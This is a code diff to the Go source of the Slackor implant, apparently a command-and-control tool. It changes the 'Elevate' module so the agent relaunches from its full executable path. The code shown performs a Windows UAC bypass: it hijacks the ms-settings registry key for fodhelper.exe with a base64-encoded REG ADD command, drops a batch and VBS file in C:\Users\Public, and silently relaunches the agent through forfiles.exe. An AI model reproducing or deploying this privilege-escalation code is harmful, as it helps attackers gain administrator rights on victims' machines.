@@ -6,12 +6,12 @@ import (
 	"encoding/base64"
 	"errors"
 	"fmt"
+	"github.com/n00py/Slackor/pkg/command"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"syscall"
 	"time"
-
-	"github.com/n00py/Slackor/pkg/command"
 )
 
 // Elevate bypasses UAC
@@ -28,8 +28,15 @@ func (e Elevate) Run(clientID string, jobID string, args []string) (string, erro
 		return "", errors.New("elevate takes 1 argument")
 	}
 	mode := args[0]
-
+	ex, err := os.Executable()
+	if err != nil {
+		panic(err)
+	}
+	exPath := filepath.Dir(ex)
+	exName := filepath.Base(os.Args[0])
+	exAgent := (exPath + "\\" + exName)
 	switch mode {
+
 	//Bypasses UAC using fodhelper.exe technique.
 	case "fodhelper":
 		//REG ADD HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\command /V DelegateExecute /t REG_SZ /F
@@ -38,7 +45,7 @@ func (e Elevate) Run(clientID string, jobID string, args []string) (string, erro
 		//REG ADD HKCU\SOFTWARE\Classes\ms-settings\Shell\Open\command  /t REG_SZ /F  /D "wscript %APPDATA%\build.vbs"
 		var wscriptkey string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXENsYXNzZXNcbXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kICAvdCBSRUdfU1ogL0YgIC9EICJ3c2NyaXB0ICVBUFBEQVRBJVxidWlsZC52YnMi"
 		Decodedwscript, _ := base64.StdEncoding.DecodeString(wscriptkey)
-		wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + os.Args[0] + "\", 0, False"
+		wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + exAgent + "\", 0, False"
 		//Creates a bat file
 		UAC, err := os.Create("C:\\Users\\Public\\build.bat")
 		if err != nil {
@@ -65,7 +72,7 @@ func (e Elevate) Run(clientID string, jobID string, args []string) (string, erro
 			return "", err
 		}
 	case "ask":
-		wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + os.Args[0] + "\", 0, False"
+		wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + exAgent + "\", 0, False"
 		UAC, err := os.Create("C:\\Users\\Public\\build.bat")
 		if err != nil {
 			return "", err
